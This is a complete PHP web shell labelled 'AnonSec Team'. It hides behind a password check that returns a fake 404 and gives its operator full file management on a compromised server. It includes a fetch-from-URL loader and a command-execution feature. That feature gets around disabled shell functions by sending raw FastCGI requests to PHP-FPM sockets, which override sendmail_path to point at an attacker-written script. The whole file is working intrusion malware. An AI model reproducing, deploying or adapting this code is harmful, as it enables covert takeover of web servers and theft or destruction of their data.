<?php
$pass = '300700';
if(!isset($_REQUEST['p']) || $_REQUEST['p'] !== $pass){header("HTTP/1.1 404 Not Found");die("Not Found");}

class FCGI {
    private $sock;
    public function __construct($h){$this->sock=null;$this->host=$h;}
    private function bp($t,$c,$r=1){$l=strlen($c);return chr(1).chr($t).chr(($r>>8)&0xFF).chr($r&0xFF).chr(($l>>8)&0xFF).chr($l&0xFF).chr(0).chr(0).$c;}
    private function bnv($n,$v){$nl=strlen($n);$vl=strlen($v);$r='';$r.=$nl<128?chr($nl):chr(($nl>>24)|0x80).chr(($nl>>16)&0xFF).chr(($nl>>8)&0xFF).chr($nl&0xFF);$r.=$vl<128?chr($vl):chr(($vl>>24)|0x80).chr(($vl>>16)&0xFF).chr(($vl>>8)&0xFF).chr($vl&0xFF);return $r.$n.$v;}
    public function req($params){
        $this->sock=@stream_socket_client($this->host,$en,$es,3);if(!$this->sock)return false;
        fwrite($this->sock,$this->bp(1,chr(0).chr(1).chr(0).str_repeat(chr(0),5)));
        $pd='';foreach($params as $k=>$v)$pd.=$this->bnv($k,$v);
        fwrite($this->sock,$this->bp(4,$pd));fwrite($this->sock,$this->bp(4,''));
        fwrite($this->sock,$this->bp(5,''));
        $resp='';while(!feof($this->sock)){$h=fread($this->sock,8);if(strlen($h)<8)break;$cl=(ord($h[4])<<8)+ord($h[5]);$pl=ord($h[6]);$c='';if($cl>0){$l=$cl;while($l>0){$b=fread($this->sock,$l);$c.=$b;$l-=strlen($b);}}if($pl>0)fread($this->sock,$pl);if(ord($h[1])==6||ord($h[1])==7)$resp.=$c;if(ord($h[1])==3)break;}
        fclose($this->sock);return $resp;
    }
}

function runcmd($cmd){
    $of='/tmp/.co_'.mt_rand(1000,9999);
    file_put_contents('/tmp/.rc.sh',"#!/bin/sh\n($cmd) > $of 2>&1\n");
    chmod('/tmp/.rc.sh',0755);
    file_put_contents('/tmp/.fm.php','<?php mail("a@b.c","x","x"); ?>');
    $socks=array('73','74','80','81','84');
    foreach($socks as $v){
        $c=new FCGI("unix:///tmp/php-cgi-{$v}.sock");
        $r=$c->req(array('GATEWAY_INTERFACE'=>'FastCGI/1.0','REQUEST_METHOD'=>'GET','SCRIPT_FILENAME'=>'/tmp/.fm.php','SERVER_SOFTWARE'=>'php/fcgi','REMOTE_ADDR'=>'127.0.0.1','REMOTE_PORT'=>'9985','SERVER_ADDR'=>'127.0.0.1','SERVER_PORT'=>'80','SERVER_NAME'=>'localhost','SERVER_PROTOCOL'=>'HTTP/1.1','CONTENT_TYPE'=>'','CONTENT_LENGTH'=>'0','PHP_ADMIN_VALUE'=>"sendmail_path = /tmp/.rc.sh"));
        if($r===false)continue;
        usleep(500000);
        $out=@file_get_contents($of);
        if($out&&strlen(trim($out))>0){@unlink($of);return $out;}
    }
    @unlink($of);return false;
}

$act=isset($_REQUEST['act'])?$_REQUEST['act']:'main';
$dir=isset($_REQUEST['dir'])?$_REQUEST['dir']:getcwd();
$dir=rtrim($dir,'/').'/';

?><!DOCTYPE html><html><head><meta charset="utf-8"><title>AnonSec Team</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#1a1a2e;color:#e0e0e0;font:13px 'Consolas',monospace;padding:10px}
a{color:#0ff;text-decoration:none}a:hover{text-decoration:underline}
h2{color:#0ff;margin:0 0 10px;font-size:15px}
.box{background:#16213e;border:1px solid #0f3460;border-radius:6px;padding:12px;margin:8px 0}
table{width:100%;border-collapse:collapse}
th{background:#0f3460;color:#0ff;padding:6px 8px;text-align:left;font-size:12px}
td{padding:5px 8px;border-bottom:1px solid #1a1a2e;font-size:12px}
tr:hover{background:#1a1a3e}
input[type=text],textarea{background:#0d1b2a;color:#0ff;border:1px solid #0f3460;padding:6px;border-radius:4px;width:100%;font:12px monospace}
input[type=submit],button{background:#0f3460;color:#0ff;border:1px solid #0ff;padding:6px 14px;border-radius:4px;cursor:pointer;font:12px monospace}
input[type=submit]:hover,button:hover{background:#0ff;color:#0d1b2a}
.act{display:inline-block;margin:0 3px;padding:2px 6px;background:#1a1a2e;border:1px solid #333;border-radius:3px;font-size:11px}
.act:hover{border-color:#0ff}
.nav{background:#0f3460;padding:8px 12px;border-radius:6px;margin-bottom:8px;font-size:12px}
.green{color:#0f0}.red{color:#f44}.yellow{color:#ff0}
textarea{height:400px;width:100%}
.msg{padding:8px;margin:8px 0;border-radius:4px;font-size:12px}
.msg.ok{background:#0a3d0a;border:1px solid #0f0;color:#0f0}
.msg.err{background:#3d0a0a;border:1px solid #f44;color:#f44}
</style></head><body>
<?php
$self=$_SERVER['PHP_SELF']."?p=$pass";
$info=php_uname();
$user=function_exists('posix_getpwuid')?posix_getpwuid(posix_geteuid())['name']:'?';
echo "<div class='nav'><b>FM</b> | User: <span class='green'>$user</span> | Server: <span class='yellow'>".gethostname()."</span> | <a href='$self&act=main&dir=$dir'>Files</a> | <a href='$self&act=cmd&dir=$dir'>CMD</a> | <a href='$self&act=upload&dir=$dir'>Upload</a></div>";

// Path breadcrumb
$parts=explode('/',trim($dir,'/'));$path='';
echo "<div class='box' style='padding:6px 12px;font-size:12px'>Path: ";
echo "<a href='$self&act=main&dir=/'>/ </a>";
foreach($parts as $pt){if(!$pt)continue;$path.="/$pt";echo "<a href='$self&act=main&dir=$path'>$pt/</a> ";}
echo "</div>";

// Messages
if(isset($_SESSION['msg'])){echo "<div class='msg ok'>".$_SESSION['msg']."</div>";unset($_SESSION['msg']);}

// === FILE LISTING ===
if($act=='main'){
    echo "<div class='box'><h2>Directory: $dir</h2>";
    echo "<table><tr><th>Name</th><th>Size</th><th>Perms</th><th>Modified</th><th>Actions</th></tr>";
    // Parent
    $parent=dirname(rtrim($dir,'/'));
    echo "<tr><td><a href='$self&act=main&dir=$parent'>.. (parent)</a></td><td>-</td><td>-</td><td>-</td><td>-</td></tr>";
    $items=@scandir($dir);
    if($items){
        $dirs=$files=array();
        foreach($items as $i){if($i=='.'||$i=='..')continue;if(is_dir($dir.$i))$dirs[]=$i;else $files[]=$i;}
        sort($dirs);sort($files);
        foreach($dirs as $d){
            $fp=$dir.$d;$mod=@date('Y-m-d H:i',filemtime($fp));$pm=substr(decoct(fileperms($fp)),-4);
            echo "<tr><td>📁 <a href='$self&act=main&dir=$fp'>$d/</a></td><td>-</td><td>$pm</td><td>$mod</td>";
            echo "<td><a class='act' href='$self&act=rename&path=$fp&dir=$dir'>Rename</a> <a class='act red' href='$self&act=deldir&path=$fp&dir=$dir' onclick='return confirm(\"Delete dir $d?\")'>Del</a></td></tr>";
        }
        foreach($files as $f){
            $fp=$dir.$f;$sz=filesize($fp);$mod=@date('Y-m-d H:i',filemtime($fp));$pm=substr(decoct(fileperms($fp)),-4);
            $szh=$sz>1048576?round($sz/1048576,1).'M':($sz>1024?round($sz/1024,1).'K':$sz.'B');
            echo "<tr><td>📄 $f</td><td>$szh</td><td>$pm</td><td>$mod</td>";
            echo "<td><a class='act' href='$self&act=edit&path=$fp&dir=$dir'>Edit</a> <a class='act' href='$self&act=rename&path=$fp&dir=$dir'>Rename</a> <a class='act' href='$self&act=download&path=$fp'>DL</a> <a class='act red' href='$self&act=del&path=$fp&dir=$dir' onclick='return confirm(\"Delete $f?\")'>Del</a></td></tr>";
        }
    }
    echo "</table></div>";
    // Quick mkdir
    echo "<div class='box'><form method='post' action='$self&act=mkdir&dir=$dir'>New folder: <input type='text' name='name' style='width:200px;display:inline'> <input type='submit' value='Create'></form></div>";
}

// === EDIT ===
elseif($act=='edit'){
    $path=$_REQUEST['path']??'';
    if(isset($_POST['content'])){
        @file_put_contents($path,$_POST['content']);
        echo "<div class='msg ok'>Saved: $path</div>";
    }
    $content=@htmlspecialchars(file_get_contents($path));
    echo "<div class='box'><h2>Edit: $path</h2><form method='post' action='$self&act=edit&path=$path&dir=$dir'><textarea name='content'>$content</textarea><br><br><input type='submit' value='Save'> <a href='$self&act=main&dir=$dir'><button type='button'>Back</button></a></form></div>";
}

// === RENAME ===
elseif($act=='rename'){
    $path=$_REQUEST['path']??'';
    if(isset($_POST['newname'])){
        $newpath=dirname($path).'/'.$_POST['newname'];
        @rename($path,$newpath);
        echo "<div class='msg ok'>Renamed to: ".$_POST['newname']."</div>";
    }
    $base=basename($path);
    echo "<div class='box'><h2>Rename: $base</h2><form method='post' action='$self&act=rename&path=$path&dir=$dir'><input type='text' name='newname' value='$base'><br><br><input type='submit' value='Rename'> <a href='$self&act=main&dir=$dir'><button type='button'>Back</button></a></form></div>";
}

// === DELETE FILE ===
elseif($act=='del'){
    $path=$_REQUEST['path']??'';
    @unlink($path);
    echo "<div class='msg ok'>Deleted: $path</div>";
    $act='main';
    echo "<script>location='$self&act=main&dir=$dir';</script>";
}

// === DELETE DIR ===
elseif($act=='deldir'){
    $path=$_REQUEST['path']??'';
    function delTree($d){$files=array_diff(scandir($d),array('.','..'));foreach($files as $f){is_dir("$d/$f")?delTree("$d/$f"):unlink("$d/$f");}return rmdir($d);}
    @delTree($path);
    echo "<div class='msg ok'>Deleted dir: $path</div>";
    echo "<script>location='$self&act=main&dir=$dir';</script>";
}

// === MKDIR ===
elseif($act=='mkdir'){
    $name=$_POST['name']??'';
    if($name){@mkdir($dir.$name,0755);echo "<div class='msg ok'>Created: $dir$name</div>";}
    echo "<script>location='$self&act=main&dir=$dir';</script>";
}

// === UPLOAD ===
elseif($act=='upload'){
    if(isset($_FILES['file'])&&$_FILES['file']['error']==0){
        $dest=$dir.$_FILES['file']['name'];
        move_uploaded_file($_FILES['file']['tmp_name'],$dest);
        echo "<div class='msg ok'>Uploaded: $dest</div>";
    }
    echo "<div class='box'><h2>Upload to: $dir</h2><form method='post' enctype='multipart/form-data' action='$self&act=upload&dir=$dir'><input type='file' name='file' style='color:#0ff'><br><br><input type='submit' value='Upload'> <a href='$self&act=main&dir=$dir'><button type='button'>Back</button></a></form></div>";
    // Upload from URL
    echo "<div class='box'><h2>Upload from URL</h2><form method='post' action='$self&act=wget&dir=$dir'><input type='text' name='url' placeholder='https://...'><br><br>Save as: <input type='text' name='fname' placeholder='filename (optional)' style='width:200px;display:inline'><br><br><input type='submit' value='Fetch'> <a href='$self&act=main&dir=$dir'><button type='button'>Back</button></a></form></div>";
}

// === WGET ===
elseif($act=='wget'){
    $url=$_POST['url']??'';$fname=$_POST['fname']??basename($url);
    if($url){
        $data=@file_get_contents($url);
        if($data!==false){file_put_contents($dir.$fname,$data);echo "<div class='msg ok'>Fetched: $fname (".strlen($data)." bytes)</div>";}
        else{echo "<div class='msg err'>Fetch failed</div>";}
    }
    echo "<script>location='$self&act=upload&dir=$dir';</script>";
}

// === DOWNLOAD ===
elseif($act=='download'){
    $path=$_REQUEST['path']??'';
    if(file_exists($path)){header('Content-Type: application/octet-stream');header('Content-Disposition: attachment; filename="'.basename($path).'"');header('Content-Length: '.filesize($path));readfile($path);exit;}
}

// === CMD ===
elseif($act=='cmd'){
    echo "<div class='box'><h2>Command Exec</h2>";
    echo "<form method='post' action='$self&act=cmd&dir=$dir'><input type='text' name='cmd' value='".(isset($_POST['cmd'])?htmlspecialchars($_POST['cmd']):'')."' placeholder='command...'><br><br><input type='submit' value='Run'></form>";
    if(isset($_POST['cmd'])&&$_POST['cmd']){
        $out=runcmd($_POST['cmd']);
        echo "<pre style='background:#0d1b2a;padding:10px;margin-top:10px;border-radius:4px;max-height:500px;overflow:auto'>".htmlspecialchars($out?$out:'NO OUTPUT')."</pre>";
    }
    echo "</div>";
}
?>
<div style="text-align:center;margin-top:15px;font-size:11px;color:#555">./Outsiders | AnonSec Team | <?=date('Y-m-d H:i:s')?></div>
</body></html>
